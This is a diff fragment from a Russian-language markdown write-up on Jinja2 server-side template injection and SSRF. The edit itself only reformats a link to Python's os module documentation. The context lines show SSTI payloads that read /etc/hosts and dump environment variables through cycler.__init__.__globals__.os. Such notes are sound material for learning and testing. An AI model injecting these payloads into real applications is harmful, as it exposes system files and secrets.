@@ -278,7 +278,7 @@ Jinja2 SSTI + SSRF
 {{ cycler.__init__.__globals__.os.read(cycler.__init__.__globals__.os.open("/etc/hosts", 0), 1000) }} # читаем файлы
 ```
 
-Документация библиотеки ОС нужной версии - https://docs.python.org/3.11/library/os.html
+Документация библиотеки `os` нужной версии - [docs.python.org/3.11/library/os](https://docs.python.org/3.11/library/os.html)
 
 Ответ на `{{ cycler.__init__.__globals__.os.environ }}`:
 ```
